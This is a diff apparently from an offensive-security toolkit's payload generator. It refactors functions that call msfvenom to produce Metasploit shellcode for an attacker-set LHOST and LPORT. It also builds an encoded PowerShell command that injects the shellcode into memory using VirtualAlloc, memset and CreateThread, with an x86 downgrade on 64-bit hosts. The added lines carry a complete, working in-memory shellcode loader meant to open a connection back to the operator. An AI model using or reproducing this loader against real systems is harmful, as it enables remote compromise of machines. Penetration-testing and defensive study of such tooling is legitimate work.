@@ -1200,8 +1200,7 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
     # generate our shellcode first
     shellcode = metasploit_shellcode(payload, ipaddr, port)
-    shellcode = shellcode_replace(ipaddr, port, shellcode)
-    shellcode = shellcode.rstrip()
+    shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
     # sub in \x for 0x
     shellcode = re.sub("\\\\x", "0x", shellcode)
     # base counter
@@ -1220,10 +1219,8 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
     # heres our shellcode prepped and ready to go
     shellcode = newdata[:-1]
-
     # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
-    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" %  (shellcode))	
-
+    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $gq"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $gq";}""" %  (shellcode))	
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le'))
 
@@ -1235,13 +1232,8 @@ def generate_shellcode(payload,ipaddr,port):
     proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
-    data = data.replace(";", "")
-    data = data.replace(" ", "")
-    data = data.replace("+", "")
-    data = data.replace('"', "")
-    data = data.replace("\n", "")
-    data = data.replace("buf=", "")
-    data = data.rstrip()
+    repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : ''}
+    data = reduce(lambda a, kv: a.replace(*kv), repls.iteritems(), data).rstrip()
     # return data
     return data
 
